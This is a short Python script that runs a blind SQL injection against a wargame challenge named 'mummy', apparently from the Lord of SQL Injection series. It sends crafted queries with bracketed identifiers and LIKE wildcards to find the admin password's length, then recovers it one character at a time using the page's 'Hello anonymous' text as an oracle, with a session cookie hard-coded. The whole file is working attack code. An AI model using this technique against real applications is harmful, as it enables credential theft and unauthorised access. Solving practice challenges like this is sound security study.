from email.policy import strict
import string
import requests

url = "https://los.rubiya.kr/chall/mummy_2e13c2a4483d845ce2d37f7c910f0f83.php"
params = {"query" : None}
cookies = {"PHPSESSID" : "qp6b7g99hjr3amos0h8f72npl5"}

# 비밀번호 길이 구하기
for i in range(30):
    payload = "[pw]from[prob_mummy]where[id]='admin'and[pw]like'{}'".format(i*'_')
    print(payload)
    params["query"] = payload
    response = requests.get(url,params=params,cookies=cookies)
    if("Hello anonymous" in response.text):
        print("find the pw_length",i)
        break

flag = ''
for i in range(1,9):
    for j in string.printable:
        payload="[pw]from[prob_mummy]where[id]='admin'and[pw]like'{}%'".format(flag+j)
        print(payload)
        params["query"] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello anonymous" in response.text):
            flag += j
            print("find the pw",flag)
            break